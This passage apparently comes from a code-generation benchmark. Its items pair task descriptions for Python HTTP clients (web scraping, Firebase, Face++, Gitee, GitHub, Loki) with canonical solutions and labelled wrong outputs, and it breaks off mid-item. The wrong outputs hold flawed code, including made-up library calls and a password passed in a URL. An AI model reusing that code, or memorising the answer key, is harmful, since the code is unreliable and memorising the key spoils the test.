    "wrong_result": "import requests\nfrom bs4 import BeautifulSoup\nimport os\n\ndef download_xkcd_comic(issue_number):\n    base_url = \"https://xkcd.com/\"\n    full_url = f\"{base_url}{issue_number}/\"\n    \n    try:\n        response = requests.get(full_url)\n        response.raise_for_status()\n    except requests.exceptions.RequestException as e:\n        return f\"Error: {str(e)}\"\n    \n    soup = BeautifulSoup(response.text, 'html.parser')\n    comic_img_tag = soup.find('img', {'id': 'comic'})\n    \n    if not comic_img_tag or 'src' not in comic_img_tag.attrs:\n        return \"Error: Comic image not found on the page.\"\n    \n    img_url = comic_img_tag['src']\n    if not img_url.startswith('https'):\n        img_url = requests.compat.urljoin(base_url, img_url)\n    \n    try:\n        img_response = requests.get(img_url, stream=True)\n        img_response.raise_for_status()\n    except requests.exceptions.RequestException as e:\n        return f\"Error: {str(e)}\"\n    \n    filename = os.path.basename(img_url)\n    with open(filename, 'wb') as f:\n        for chunk in img_response.iter_content(chunk_size=8192):\n            f.write(chunk)\n    \n    return f\"Success: Comic image saved as {filename}\""
  },
  {
    "Task_id": 7,
    "Instruction": "Task Description: Create a Python function that makes an HTTP request to a specified API endpoint, handles the response, and manages errors appropriately. The function should support proxy configuration and include request signing.\n\nFunction Description: The `request` function sends an HTTP request to a predefined API endpoint. It constructs the request with proper parameters, handles the connection (including proxy support if configured), processes the response, and manages errors. The function includes logging for debugging and error tracking.\n\nInput:\n- `action`: [str] - The API endpoint action to be called (appended to '/api/')\n- `param`: [dict, optional] - A dictionary of parameters to be sent with the request\n- `**params`: [dict] - Additional parameters to be merged with `param`\n\nOutput:\n- Returns: [dict] - The 'data' field from the JSON response if successful\n- Raises:\n  - Exception: If the HTTP status code indicates an error (non-2xx)\n  - Exception: If the API response contains an error code\n  - Exception: If the response data is None\n\nThe function performs the following steps:\n1. Merges input parameters and signs them\n2. Establishes an HTTPS connection (with optional proxy support)\n3. Sends the request with proper headers\n4. Reads and decodes the response\n5. Validates the response status and content\n6. Returns the parsed data or raises appropriate exceptions",
    "Canonical_solution": "from hashlib import md5\nfrom json import loads as jsondecode\nfrom logging import debug, info, warning\nfrom time import mktime\nfrom datetime import datetime\nfrom http.client import HTTPSConnection\nfrom urllib.parse import urlencode\n\nclass Config:\n    ID = \"id\"\n    TOKEN = \"TOKEN\"\n    PROXY = None\n    TTL = None\n\nclass API:\n    SITE = \"www.dns.com\"\n    METHOD = \"POST\"\n\ndef request(action, param=None, **params):\n    if param:\n        params.update(param)\n    params = dict((k, params[k]) for k in params if params[k] is not None)\n    params = signature(params)\n    info(\"%s/api/%s/ : params:%s\", API.SITE, action, params)\n\n    if Config.PROXY:\n        conn = HTTPSConnection(Config.PROXY)\n        conn.set_tunnel(API.SITE, 443)\n    else:\n        conn = HTTPSConnection(API.SITE)\n\n    conn.request(API.METHOD, '/api/' + action + '/', urlencode(params),\n                 {\"Content-type\": \"application/x-www-form-urlencoded\"})\n    response = conn.getresponse()\n    result = response.read().decode('utf8')\n    conn.close()\n\n    if response.status < 200 or response.status >= 300:\n        warning('%s : error[%d]:%s', action, response.status, result)\n        raise Exception(result)\n    else:\n        data = jsondecode(result)\n        debug('%s : result:%s', action, data)\n        if data.get('code') != 0:\n            raise Exception(\"api error:\", data.get('message'))\n        data = data.get('data')\n        if data is None:\n            raise Exception('response data is none')\n        return data",
    "Code_level": "Function-level",
    "FSMID_for_test": 56,
    "wrong_result": "import requests\nimport logging\nimport json\nfrom urllib.parse import urlencode\n\nlogging.basicConfig(level=logging.DEBUG)\n\ndef request(action, param=None, **params):\n    # Merge parameters\n    merged_params = {**param, **params}\n    \n    # Sign the parameters (example signing logic)\n    signed_params = sign_parameters(merged_params)\n    \n    # Construct the URL\n    url = f'https://api.example.com/api/{action}'\n    \n    # Proxy configuration (example)\n    proxy = {\n        'https': 'http://proxy.example.com:8080'\n    }\n    \n    try:\n        # Send the request\n        headers = {'Content-Type': 'application/json'}\n        response = requests.post(url, data=signed_params, headers=headers, proxies=proxy, timeout=10)\n        \n        # Check response status code\n        if not response.status_code // 100 == 2:\n            logging.error(f'Response status code: {response.status_code}')\n            raise Exception(f'HTTP error: {response.status_code}')\n        \n        # Decode and parse JSON response\n        response_data = response.json()\n        \n        # Check for API error code\n        if 'error' in response_data:\n            logging.error(f'API error: {response_data[\"error\"]}')\n            raise Exception(response_data['error'])\n        \n        # Check if data is None\n        if response_data.get('data') is None:\n            logging.error('Response data is None')\n            raise Exception('Response data is None')\n        \n        # Return the data field\n        return response_data['data']\n    \n    except requests.exceptions.RequestException as e:\n        logging.error(f'Request exception: {e}')\n        raise Exception(f'Request failed: {e}')\n    \ndef sign_parameters(params):\n    # Example signing logic (could be HMAC, RSA, etc.)\n    # This is a placeholder; replace with actual signing mechanism\n    return urlencode(params)"
  },
  {
    "Task_id": 70,
    "Instruction": "Task Description: Implement a function to load and validate tool configurations from remote URLs by making HTTP requests and processing the responses.\n\nFunction Description: The function `load_valid_tools` takes a dictionary of tool mappings and attempts to fetch each tool's configuration from a remote server. It constructs URLs by appending \".well-known/ai-plugin.json\" to each base URL in the input dictionary. For each successful HTTP GET request (status code 200), it parses the JSON response and adds it to the output dictionary. Failed requests are logged as warnings.\n\nInput: \n- tools_mappings: [dict] - A dictionary where keys are tool identifiers and values are base URLs for the tools' configuration endpoints.\n\nOutput: \n- tools_to_config: [dict] - A dictionary where keys are the same as the input dictionary, and values are the parsed JSON configurations from successful requests. Tools with failed requests are excluded.",
    "Canonical_solution": "import requests\nimport os\nfrom bmtools import get_logger\n\nlogger = get_logger(__name__)\n\ndef load_valid_tools(tools_mappings):\n    tools_to_config = {}\n    for key in tools_mappings:\n        get_url = tools_mappings[key]+\".well-known/ai-plugin.json\"\n        \n        response = requests.get(get_url)\n\n        if response.status_code == 200:\n            tools_to_config[key] = response.json()\n        else:\n            logger.warning(\"Load tool {} error, status code {}\".format(key, response.status_code))\n\n    return tools_to_config",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport requests\nimport json\n\ndef load_valid_tools(tools_mappings):\n    tools_to_config = {}\n    for tool_id, base_url in tools_mappings.items():\n        url = f\"{base_url}.well-known/ai-plugin.json\"\n        try:\n            response = requests.get(url, timeout=10)\n            response.raise_for_status()\n            config = response.json()\n            tools_to_config[tool_id] = config\n        except requests.exceptions.RequestException as e:\n            print(f\"Warning: Failed to fetch configuration for {tool_id}: {e}\")\n    return tools_to_config\n```"
  },
  {
    "Task_id": 71,
    "Instruction": "Task Description: Create a function that scrapes and extracts text content from paragraphs of a given URL using HTTP requests and HTML parsing.\n\nFunction Description: The function should make an HTTP GET request to the specified URL, parse the HTML response to extract text from all paragraph elements (<p>), and return the combined text. It should handle potential errors in the HTTP request and log successful operations.\n\nInput: \n- url (str): The URL of the webpage to scrape text from.\n\nOutput: \n- str: The combined text extracted from all paragraph elements on the webpage, or an error message if the request fails.",
    "Canonical_solution": "import requests\nfrom bs4 import BeautifulSoup\nimport logging\n\ndef scrape_text_from_url(url):\n    response = requests.get(url)\n    if response.status_code != 200:\n        return \"Error: Could not retrieve content from URL.\"\n    soup = BeautifulSoup(response.text, \"html.parser\")\n    paragraphs = soup.find_all(\"p\")\n    text = \" \".join([p.get_text() for p in paragraphs])\n    logging.info(\"web scrape done\")\n    return text",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "import requests\nfrom bs4 import BeautifulSoup\nimport logging\n\nlogging.basicConfig(level=logging.INFO)\n\ndef extract_paragraph_text(url):\n    try:\n        response = requests.get(url, timeout=10)\n        response.raise_for_status()\n        soup = BeautifulSoup(response.text, 'html.parser')\n        paragraphs = soup.find_all('p')\n        text = ' '.join(p.get_text() for p in paragraphs)\n        logging.info(\"Successfully retrieved and extracted text from the webpage.\")\n        return text\n    except requests.RequestException as e:\n        logging.error(f\"Error fetching the webpage: {e}\")\n        return f\"Error: {str(e)}\""
  },
  {
    "Task_id": 72,
    "Instruction": "Task Description: Create a Python function that interacts with two different APIs: one for text-to-image generation (Hugging Face) and another for cloud storage (Firebase). The function should first generate an image from text using Hugging Face's API, then upload the resulting image to Firebase Storage.\n\nFunction Description: The function should take a text prompt as input, use it to generate an image via Hugging Face's API, and then upload that image to Firebase Storage. It should handle API errors gracefully and return the Firebase URL of the uploaded image.\n\nInput:\n- prompt (str): The text prompt to be converted into an image\n- destination_path (str): The path where the image should be stored in Firebase Storage\n\nOutput:\n- str: The Firebase Storage URL of the uploaded image, or None if either API call fails\n\nTask Description: Create a Python class that encapsulates the functionality for interacting with Hugging Face's text-to-image API and Firebase Storage API.\n\nClass Description: The class should manage API connections and provide methods for generating images from text and storing them in cloud storage. It should store necessary API credentials and configuration.\n\nAttributes:\n- HUGGING_FACE_API_URL (str): The endpoint URL for Hugging Face's text-to-image API\n- FIREBASE_API_URL (str): The base URL for Firebase Storage API\n- headers (dict): Authorization headers for Hugging Face API\n- API_KEY_PARAM (str): The API key parameter for Firebase requests\n- FIREBASE_STORAGE_BUCKET (str): The name of the Firebase Storage bucket\n\nMethods:\n- query(payload: dict) -> bytes: Sends a request to Hugging Face API with the given payload and returns the image data\n- upload_to_firebase_storage(image_data: bytes, destination_path: str) -> str: Uploads image data to Firebase Storage and returns the download URL\n- generate_and_store_image(prompt: str, destination_path: str) -> str: Combines both operations (generation and storage) into a single method",
    "Canonical_solution": "import requests\nfrom pydantic import Field\n\nHUGGING_FACE_API_URL = \"https://api-inference.huggingface.co/models/prompthero/openjourney-v4\"\nheaders = {\"Authorization\": f\"Bearer {HUGGING_FACE_TOKEN}\"}\nFIREBASE_API_URL = f\"https://firebasestorage.googleapis.com/v0/b/{FIREBASE_STORAGE_BUCKET}/o\"\nAPI_KEY_PARAM = f\"key={FIREBASE_API_KEY}\"\n\ndef query(payload):\n    \"\"\"\n    Queries the Hugging Face API to convert text to an image.\n    Args:\n        payload (dict): Input payload for the Hugging Face API.\n    Returns:\n        bytes: Image data.\n    \"\"\"\n    try:\n        response = requests.post(HUGGING_FACE_API_URL, headers=headers, json=payload, timeout=40)\n        return response.content\n    except requests.exceptions.RequestException as e:\n        print(f\"Error from Hugging Face API: {e}\")\n        return None\n\ndef upload_to_firebase_storage(image_data, destination_path):\n    \"\"\"\n    Uploads image data to Firebase Storage.\n    Args:\n        image_data (bytes): Image data to be uploaded.\n        destination_path (str): Path where the image will be stored.\n    Returns:\n        str: Firebase URL of the uploaded image.\n    \"\"\"\n    upload_url = f\"{FIREBASE_API_URL}/{destination_path}?{API_KEY_PARAM}\"\n    headers = {\"Content-Type\": \"image/png\"}\n\n    response = requests.post(upload_url, headers=headers, data=image_data)\n\n    if response.status_code == 200:\n        download_url = response.json().get(\"downloadTokens\", \"\")\n        firebase_url = f\"https://firebasestorage.googleapis.com/v0/b/{FIREBASE_STORAGE_BUCKET}/o/{destination_path}?alt=media&token={download_url}\"\n        return firebase_url\n    else:\n        print(\"Error uploading to Firebase Storage:\", response.content)\n        return None",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "class HuggingFaceFirebaseClient:\n    HUGGING_FACE_API_URL = \"https://api-inference.huggingface.co/models/stability-ai/sdxl\"\n    FIREBASE_API_URL = \"https://firebasestorage.googleapis.com/v1/b/{bucket}/o/{path}:upload\"\n    API_KEY_PARAM = \"key\"\n    FIREBASE_STORAGE_BUCKET = \"your-bucket-name\"\n\n    def __init__(self, hugging_face_api_key, firebase_api_key, bucket_name):\n        self.headers = {\n            \"Authorization\": f\"Bearer {hugging_face_api_key}\"\n        }\n        self.FIREBASE_STORAGE_BUCKET = bucket_name\n        self.firebase_api_key = firebase_api_key\n\n    def query(self, payload):\n        import requests\n        try:\n            response = requests.post(self.HUGGING_FACE_API_URL, headers=self.headers, json=payload)\n            response.raise_for_status()\n            return response.content\n        except requests.exceptions.RequestException as e:\n            print(f\"Hugging Face API error: {e}\")\n            return None\n\n    def upload_to_firebase_storage(self, image_data, destination_path):\n        import os\n        from google.cloud import storage\n        try:\n            client = storage.Client()\n            bucket = client.bucket(self.FIREBASE_STORAGE_BUCKET)\n            blob = bucket.blob(destination_path)\n            blob.upload_from_string(image_data, content_type=\"image/png\")\n            url = f\"https://{self.FIREBASE_STORAGE_BUCKET}.firebaseio.com/{destination_path}.json\"\n            return url\n        except Exception as e:\n            print(f\"Firebase Storage error: {e}\")\n            return None\n\n    def generate_and_store_image(self, prompt, destination_path):\n        payload = {\"inputs\": prompt}\n        image_data = self.query(payload)\n        if image_data:\n            return self.upload_to_firebase_storage(image_data, destination_path)\n        return None"
  },
  {
    "Task_id": 76,
    "Instruction": "Task Description: Create a Python function that interacts with the Face++ API to perform face detection on an image, including face count verification and extraction of facial attributes.\n\nFunction Description: The function uses the Face++ API to detect faces in an image, verifies that exactly one face is present, and extracts facial rectangle coordinates and headpose information. It handles various API response status codes and raises appropriate exceptions for errors.\n\nInput:\n- ctx: A context object containing:\n  - origin_image: The original image to be processed (expected to be an image object)\n\nOutput:\n- Modifies the ctx object by adding:\n  - face[\"rectangle\"]: Tuple containing (left, top, width, height) coordinates of the detected face\n  - face[\"roll_angle\"]: The roll angle of the detected face (divided by 2)\n- Raises:\n  - FaceError: When zero or multiple faces are detected\n  - APIError: For various API-related errors (authentication, authorization, bad request, etc.)",
    "Canonical_solution": "import os\nimport requests\nfrom hivision.error import FaceError, APIError\nfrom hivision.utils import resize_image_to_kb_base64\n\ndef detect_face_face_plusplus(ctx):\n    \"\"\"\n    \u57fa\u4e8eFace++ API\u63a5\u53e3\u7684\u4eba\u8138\u68c0\u6d4b\u5904\u7406\u5668\uff0c\u53ea\u8fdb\u884c\u4eba\u8138\u6570\u91cf\u7684\u68c0\u6d4b\n    :param ctx: \u4e0a\u4e0b\u6587\uff0c\u6b64\u65f6\u5df2\u83b7\u53d6\u5230\u539f\u59cb\u56fe\u548c\u62a0\u56fe\u7ed3\u679c\uff0c\u4f46\u662f\u6211\u4eec\u53ea\u9700\u8981\u539f\u59cb\u56fe\n    :raise FaceError: \u4eba\u8138\u68c0\u6d4b\u9519\u8bef\uff0c\u591a\u4e2a\u4eba\u8138\u6216\u8005\u6ca1\u6709\u4eba\u8138\n    :raise APIError: API\u8c03\u7528\u9519\u8bef\n    \"\"\"\n    url = \"https://api-cn.faceplusplus.com/facepp/v3/detect\"\n    api_key = os.getenv(\"FACE_PLUS_API_KEY\")\n    api_secret = os.getenv(\"FACE_PLUS_API_SECRET\")\n\n    image = ctx.origin_image\n    image_base64 = resize_image_to_kb_base64(image, 2000, mode=\"max\")\n\n    files = {\n        \"api_key\": (None, api_key),\n        \"api_secret\": (None, api_secret),\n        \"image_base64\": (None, image_base64),\n        \"return_landmark\": (None, \"1\"),\n        \"return_attributes\": (None, \"headpose\"),\n    }\n\n    response = requests.post(url, files=files)\n    status_code = response.status_code\n    response_json = response.json()\n\n    if status_code == 200:\n        face_num = response_json[\"face_num\"]\n        if face_num == 1:\n            face_rectangle = response_json[\"faces\"][0][\"face_rectangle\"]\n            headpose = response_json[\"faces\"][0][\"attributes\"][\"headpose\"]\n            roll_angle = headpose[\"roll_angle\"] / 2\n\n            ctx.face[\"rectangle\"] = (\n                face_rectangle[\"left\"],\n                face_rectangle[\"top\"],\n                face_rectangle[\"width\"],\n                face_rectangle[\"height\"],\n            )\n            ctx.face[\"roll_angle\"] = roll_angle\n        else:\n            raise FaceError(\n                \"Expected 1 face, but got {}\".format(face_num), len(face_num)\n            )\n    elif status_code == 401:\n        raise APIError(\n            f\"Face++ Status code {status_code} Authentication error: API key and secret do not match.\",\n            status_code,\n        )\n    elif status_code == 403:\n        reason = response_json.get(\"error_message\", \"Unknown authorization error.\")\n        raise APIError(\n            f\"Authorization error: {reason}\",\n            status_code,\n        )\n    elif status_code == 400:\n        error_message = response_json.get(\"error_message\", \"Bad request.\")\n        raise APIError(\n            f\"Bad request error: {error_message}\",\n            status_code,\n        )\n    elif status_code == 413:\n        raise APIError(\n            f\"Face++ Status code {status_code} Request entity too large: The image exceeds the 2MB limit.\",\n            status_code,\n        )",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "import facepp\n\ndef detect_face(ctx):\n    client = facepp.Client('YOUR_API_KEY', 'YOUR_API_SECRET')\n    result = client.detection.detect(ctx.origin_image)\n    \n    if result['error_code'] != 0:\n        raise facepp.FaceError(result['error_msg'])\n    \n    faces = result['face']\n    if not isinstance(faces, list):\n        faces = [faces]\n    \n    if len(faces) != 1:\n        raise facepp.FaceError(\"Exactly one face must be detected\")\n    \n    face = faces[0]\n    rectangle = (face['left'], face['top'], face['width'], face['height'])\n    roll_angle = face['roll_angle'] / 2\n    \n    ctx.face = {\n        \"rectangle\": rectangle,\n        \"roll_angle\": roll_angle\n    }"
  },
  {
    "Task_id": 77,
    "Instruction": "Task Description: Implement a function to check for software updates by querying a GitHub repository's API, comparing versions, and notifying if a new version is available.\n\nFunction Description: The function `check_update()` checks for updates by making HTTP requests to GitHub's API. It handles both stable releases and pre-releases based on configuration, compares version numbers, and provides appropriate notifications/logs about update availability. The function uses external configurations for update preferences and notification settings.\n\nInput: None (uses module-level configuration from `cfg` for settings like update preferences, user agent, and current version)\n\nOutput: None (but has side effects: may log update information and send notifications through the `notif` system)",
    "Canonical_solution": "from tasks.base.fastest_mirror import FastestMirror\nfrom module.logger import log\nfrom module.config import cfg\nfrom module.notification import notif\nfrom packaging.version import parse\nimport requests\n\ndef check_update():\n    try:\n        if cfg.update_prerelease_enable:\n            response = requests.get(FastestMirror.get_github_api_mirror(\"moesnow\", \"March7thAssistant\", False), timeout=10, headers=cfg.useragent)\n        else:\n            response = requests.get(FastestMirror.get_github_api_mirror(\"moesnow\", \"March7thAssistant\"), timeout=10, headers=cfg.useragent)\n        if not cfg.check_update:\n            return\n        if response.status_code == 200:\n            if cfg.update_prerelease_enable:\n                data = response.json()[0]\n            else:\n                data = response.json()\n\n            version = data[\"tag_name\"]\n\n            assert_url = None\n            for asset in data[\"assets\"]:\n                if (cfg.update_full_enable and \"full\" in asset[\"browser_download_url\"]) or \\\n                   (not cfg.update_full_enable and \"full\" not in asset[\"browser_download_url\"]):\n                    assert_url = asset[\"browser_download_url\"]\n                    break\n\n            if assert_url is not None and parse(version.lstrip('v')) > parse(cfg.version.lstrip('v')):\n                notif.notify(cfg.notify_template['NewVersion'].format(version=version))\n                log.info(f\"\u53d1\u73b0\u65b0\u7248\u672c\uff1a{cfg.version}  \u2014\u2014\u2192  {version}\")\n                log.info(data[\"html_url\"])\n            else:\n                log.info(f\"\u5df2\u7ecf\u662f\u6700\u65b0\u7248\u672c\uff1a{cfg.version}\")\n        else:\n            log.warning(\"\u68c0\u6d4b\u66f4\u65b0\u5931\u8d25\")\n            log.debug(response.text)\n    except Exception:\n        pass",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "import requests\nimport logging\nfrom packaging import version\n\ndef check_update():\n    # GitHub API endpoint for repository releases\n    repo_url = \"https://api.github.com/repos/your-username/your-repo/releases/latest\"\n    \n    # Headers with user agent as per configuration\n    headers = {\n        \"User-Agent\": cfg.user_agent\n    }\n    \n    try:\n        response = requests.get(repo_url, headers=headers, timeout=10)\n        response.raise_for_status()\n        \n        # Parse JSON response\n        data = response.json()\n        \n        # Get the latest version from the release\n        latest_version = data.get(\"tag_name\", \"\").lstrip(\"v\")\n        \n        # Compare with current version\n        current_version = cfg.current_version\n        if version.parse(latest_version) > version.parse(current_version):\n            logging.info(f\"New version available: {latest_version}\")\n            notif.notify(f\"Update available: {latest_version}\")\n        elif version.parse(latest_version) == version.parse(current_version):\n            logging.info(\"Current version is up to date.\")\n        else:\n            logging.info(\"No new version available.\")\n    \n    except requests.exceptions.RequestException as e:\n        logging.error(f\"Error fetching updates: {e}\")\n    except Exception as e:\n        logging.error(f\"Unexpected error: {e}\")"
  },
  {
    "Task_id": 8,
    "Instruction": "Task Description: Create a Python class that manages JavaScript libraries and CSS files, loading their contents from remote URLs via HTTP/HTTPS and storing them for later use.\n\nClass Description: The `Javascript` class handles the loading and storage of JavaScript libraries and CSS files from remote sources. It provides functionality to initialize with URLs, normalize them into lists, and fetch their contents over HTTP/HTTPS connections.\n\nAttributes:\n- lib: [Sequence[str]] - List of URLs pointing to JavaScript libraries to be loaded\n- css: [Sequence[str]] - List of URLs pointing to CSS files to be loaded\n- data: [str] - Additional inline JavaScript code\n- javascript_contents: [dict[str, str]] - Dictionary mapping library URLs to their loaded content\n\nMethods:\n- __init__(data: Optional[str] = None, lib: Optional[Union[str, Sequence]] = None, css: Optional[Union[str, Sequence]] = None) -> None - Initializes the class instance, normalizing input parameters into lists\n- load_javascript_contents() -> Javascript - Loads the contents of all JavaScript libraries specified in lib attribute via HTTP/HTTPS, stores them in javascript_contents, and returns self for method chaining",
    "Canonical_solution": "from ..types import Optional, Sequence, Union\nfrom urllib.parse import urlparse\nimport http.client\n\nclass Javascript:\n    def __init__(\n        self,\n        data: Optional[str] = None,\n        lib: Optional[Union[str, Sequence]] = None,\n        css: Optional[Union[str, Sequence]] = None,\n    ):\n        if isinstance(lib, str):\n            lib = [lib]\n        elif lib is None:\n            lib = []\n        if isinstance(css, str):\n            css = [css]\n        elif css is None:\n            css = []\n        self.lib = lib\n        self.css = css\n        self.data = data or \"\"\n        self.javascript_contents = dict()\n\n    def load_javascript_contents(self):\n        for lib in self.lib:\n            parsed_url = urlparse(lib)\n            host: str = str(parsed_url.hostname)\n            port: int = parsed_url.port\n            path: str = parsed_url.path\n\n            resp: Optional[http.client.HTTPResponse] = None\n            try:\n                conn = http.client.HTTPSConnection(host, port)\n                conn.request(\"GET\", path)\n                resp = conn.getresponse()\n                if resp.status != 200:\n                    raise RuntimeError(\"Cannot load JavaScript lib: %s\" % lib)\n                self.javascript_contents[lib] = resp.read().decode(\"utf-8\")\n            finally:\n                if resp is not None:\n                    resp.close()\n        return self",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "wrong_result": "class Javascript:\n    def __init__(self, data: Optional[str] = None, lib: Optional[Union[str, Sequence]] = None, css: Optional[Union[str, Sequence]] = None) -> None:\n        self.lib = []\n        self.css = []\n        self.data = data\n        self.javascript_contents = {}\n        if lib is not None:\n            if isinstance(lib, str):\n                self.lib = [lib]\n            else:\n                self.lib = list(lib)\n        if css is not None:\n            if isinstance(css, str):\n                self.css = [css]\n            else:\n                self.css = list(css)\n\n    def load_javascript_contents(self) -> 'Javascript':\n        import requests\n        for url in self.lib:\n            try:\n                response = requests.get(url, timeout=10)\n                response.raise_for_status()\n                self.javascript_contents[url] = response.text\n            except requests.RequestException as e:\n                print(f\"Error loading JavaScript from {url}: {e}\")\n        return self"
  },
  {
    "Task_id": 80,
    "Instruction": "Task Description: Create a Python function to interact with Gitee's API to create a new release and upload a file to that release.\n\nFunction Description: This function performs two main operations: 1) Creates a new release in a specified Gitee repository using OAuth authentication, and 2) Uploads a specified file to the created release. The function handles authentication, API requests, and response processing.\n\nInput:\n- owner (str): The owner of the Gitee repository\n- repo (str): The name of the Gitee repository\n- tag (str): The tag name for the new release\n- file_path (str): Path to the file to be uploaded (default: \"Seraphine.7z\")\n\nOutput:\n- dict: A dictionary containing:\n  - release_id (str): The ID of the created release\n  - download_url (str): The download URL of the uploaded file\n\nNote: The function requires the following environment variables to be set:\n- GITEE_OWNER\n- GITEE_REPO\n- GITEE_USERNAME\n- GITEE_PASSWORD\n- GITEE_CLIENT_ID\n- GITEE_CLIENT_SECRET",
    "Canonical_solution": "import argparse\nimport os\nimport requests\n\nGITEE_OWNER = os.environ[\"GITEE_OWNER\"]\nGITEE_REPO = os.environ[\"GITEE_REPO\"]\nGITEE_USERNAME = os.environ[\"GITEE_USERNAME\"]\nGITEE_PASSWORD = os.environ[\"GITEE_PASSWORD\"]\nGITEE_CLIENT_ID = os.environ[\"GITEE_CLIENT_ID\"]\nGITEE_CLIENT_SECRET = os.environ[\"GITEE_CLIENT_SECRET\"]\n\ndef create_new_release(owner, repo):\n    ACCESS_TOKEN = requests.post(\n        \"https://gitee.com/oauth/token\",\n        data={\n            \"grant_type\": \"password\",\n            \"username\": GITEE_USERNAME,\n            \"password\": GITEE_PASSWORD,\n            \"client_id\": GITEE_CLIENT_ID,\n            \"client_secret\": GITEE_CLIENT_SECRET,\n            \"scope\": \"projects\",\n        },\n    ).json()[\"access_token\"]\n\n    HEADERS = {\"Authorization\": f\"Bearer {ACCESS_TOKEN}\"}\n    TAG_NAME = args.tag\n    NAME = TAG_NAME\n    BODY = f\"Seraphine {TAG_NAME}\"\n    TARGET_COMMITISH = \"master\"\n\n    url = f\"https://gitee.com/api/v5/repos/{owner}/{repo}/releases\"\n    data = {\n        \"tag_name\": TAG_NAME,\n        \"name\": NAME,\n        \"body\": BODY,\n        \"target_commitish\": TARGET_COMMITISH,\n    }\n    response = requests.post(url, data=data, headers=HEADERS, timeout=30)\n    if 200 <= response.status_code < 300:\n        return response.json()[\"id\"]\n    else:\n        print(response.json())\n        raise requests.HTTPError(\"create release on gitee failed.\")\n\ndef upload_file(onwer, repo, release_id):\n    ACCESS_TOKEN = requests.post(\n        \"https://gitee.com/oauth/token\",\n        data={\n            \"grant_type\": \"password\",\n            \"username\": GITEE_USERNAME,\n            \"password\": GITEE_PASSWORD,\n            \"client_id\": GITEE_CLIENT_ID,\n            \"client_secret\": GITEE_CLIENT_SECRET,\n            \"scope\": \"projects\",\n        },\n    ).json()[\"access_token\"]\n\n    HEADERS = {\"Authorization\": f\"Bearer {ACCESS_TOKEN}\"}\n    FILE_PATH = \"Seraphine.7z\"\n\n    url = f\"https://gitee.com/api/v5/repos/{onwer}/{repo}/releases/{release_id}/attach_files\"\n    files = {\"file\": open(FILE_PATH, \"rb\")}\n    response = requests.post(url, files=files, headers=HEADERS, timeout=30)\n\n    if 200 <= response.status_code < 300:\n        return response.json()[\"browser_download_url\"]\n    else:\n        print(response.json())\n        raise requests.HTTPError(\"push release file to Gitee failed.\")",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "import os\nimport requests\n\ndef create_gitee_release(owner, repo, tag, file_path=\"Seraphine.7z\"):\n    # Get environment variables\n    gitee_username = os.getenv(\"GITEE_USERNAME\")\n    gitee_password = os.getenv(\"GITEE_PASSWORD\")\n    gitee_client_id = os.getenv(\"GITEE_CLIENT_ID\")\n    gitee_client_secret = os.getenv(\"GITEE_CLIENT_SECRET\")\n\n    # Step 1: Get access token\n    auth_url = f\"https://gitee.com/oauth/token?client_id={gitee_client_id}&client_secret={gitee_client_secret}&grant_type=password&username={gitee_username}&password={gitee_password}\"\n    response = requests.post(auth_url)\n    response.raise_for_status()\n    access_token = response.json().get(\"access_token\")\n\n    # Step 2: Create release\n    release_url = f\"https://gitee.com/api/v5/repos/{owner}/{repo}/releases\"\n    headers = {\n        \"Authorization\": f\"token {access_token}\",\n        \"Content-Type\": \"application/json\"\n    }\n    data = {\n        \"tag_name\": tag,\n        \"name\": tag,\n        \"target_commitish\": \"main\",\n        \"body\": \"New release\",\n        \"draft\": False,\n        \"prerelease\": False\n    }\n    response = requests.post(release_url, headers=headers, json=data)\n    response.raise_for_status()\n    release_id = response.json().get(\"id\")\n    release_url = f\"https://gitee.com/{owner}/{repo}/releases/{release_id}\"\n\n    # Step 3: Upload file to release\n    upload_url = f\"{release_url}/assets\"\n    headers = {\n        \"Authorization\": f\"token {access_token}\",\n        \"Content-Type\": \"application/octet-stream\"\n    }\n    with open(file_path, \"rb\") as file:\n        files = {\"file\": (os.path.basename(file_path), file)}\n        response = requests.post(upload_url, headers=headers, files=files)\n        response.raise_for_status()\n        download_url = response.json().get(\"download_url\")\n\n    return {\n        \"release_id\": str(release_id),\n        \"download_url\": download_url\n    }"
  },
  {
    "Task_id": 81,
    "Instruction": "Task Description: Create a Python class that interacts with a Loki logging system through HTTP and WebSocket connections, allowing for querying log ranges and tailing live logs.\n\nClass Description: The LokiClient class provides methods to query historical log data (query_range) and establish a WebSocket connection for live log tailing (create_tail_ws). The LokiTailWs class manages the WebSocket connection for live log streaming.\n\nAttributes:\n- query_range_url: str - Endpoint path for querying log ranges\n- tail_url: str - Endpoint path for tailing live logs\n- base_url: str - Base URL of the Loki server\n\nMethods:\n- __init__(base_url: str) -> None - Initializes the client with the Loki server's base URL\n- query_range(query: str, start: str, end: str, limit: int = 100) -> dict - Queries log data within a specified time range\n- create_tail_ws(query: str, limit: int = 100) -> LokiTailWs - Creates a WebSocket connection for live log tailing\n\nLokiTailWs Class Description: Manages a WebSocket connection for streaming live logs from Loki.\n\nAttributes:\n- _ws: WebSocket - The active WebSocket connection\n\nMethods:\n- __init__(ws: WebSocket) -> None - Initializes with an established WebSocket connection\n- messages() -> Generator - Yields incoming log messages from the WebSocket\n- close() -> None - Closes the WebSocket connection",
    "Canonical_solution": "import urllib.parse\nimport requests\nfrom websockets.sync.client import connect as ws_connect\n\nclass LokiClient:\n    query_range_url = '/loki/api/v1/query_range'\n    tail_url = '/loki/api/v1/tail'\n\n    def __init__(self, base_url: str):\n        self.base_url = base_url.rstrip('/')\n\n    def query_range(self, query, start, end, limit=100):\n        params = {\n            'query': query,\n            'start': start,\n            'end': end,\n            'limit': limit,\n        }\n        url = f\"{self.base_url}{self.query_range_url}\"\n        response = requests.get(url, params=params)\n        if response.status_code != 200:\n            raise Exception(response.text)\n        return response.json()\n\n    def create_tail_ws(self, query, limit=100):\n        data = {'query': query, 'limit': limit}\n        params = urllib.parse.urlencode(data)\n        ws_url = f\"ws://{self.base_url[7:]}\"\n        if self.base_url.startswith('https://'):\n            ws_url = f\"wss://{self.base_url[8:]}\"\n        url = f\"{ws_url}{self.tail_url}?{params}\"\n        ws = ws_connect(url)\n        return LokiTailWs(ws)\n\nclass LokiTailWs:\n    def __init__(self, ws):\n        